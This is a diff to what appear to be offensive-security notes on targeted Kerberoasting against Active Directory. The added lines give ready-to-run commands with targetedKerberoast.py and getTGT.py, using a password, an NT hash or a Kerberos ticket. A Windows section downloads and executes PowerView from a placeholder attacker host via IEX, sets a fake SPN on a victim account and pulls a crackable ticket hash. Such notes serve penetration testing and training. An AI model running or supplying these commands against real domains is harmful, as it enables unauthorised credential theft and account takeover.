@@ -13,9 +13,35 @@ Check Shadow credentials seccion -> https://github.com/ArtesOscuras/Notes/blob/m
 
 You can make the user kerberoastable. User is required to be enabled. If it's not, enable it first. Additionally may require to sinc datetime with DC for kerberos interaction.
 
-`targetedKerberoast.py -v -d '<domain>' -u '<controlled user>' -p '<controlled user password>'`
+#### From Linux (externally, recomended):
 
-source: https://github.com/ShutdownRepo/targetedKerberoast
+With password -> `targetedKerberoast.py -v -d '<domain>' -u '<user you control>' -p '<password>'`
+
+With nt hash  -> `targetedKerberoast.py -v -d '<domain>' -u '<user you control>' -H :<nt hash>`
+
+<br>
+
+Kerberos Authentication:
+
+`getTGT.py <domain>/<user>:<password> -dc-ip <dc_ip>`
+
+`export KRB5CCNAME=<file.ccache>`
+
+`targetedKerberoast.py -v -d '<domain>' -u '<user>' -p '<password>' -k --dc-host <machine.domain>`
+
+Note: If clock error appears "KRB_AP_ERR_SKEW" use kerberos sync command before.
+
+<br>
+
+#### From Windows (internally):
+
+Load powerview module first -> `IEX (new-object net.webclient).downloadstring('http://<your_evil_ip_or_domain>/powerview.ps1')`
+
+Make sur that the target account has no SPN -> `Get-DomainUser '<victimuser>' | Select serviceprincipalname`
+
+Set the SPN -> `Set-DomainObject -Identity 'victimuser' -Set @{serviceprincipalname='nonexistent/BLAHBLAH'}`
+
+Obtain a kerberoast hash -> `$User = Get-DomainUser '<victimuser>' ; $User | Get-DomainSPNTicket | fl`
 
 <br>
 
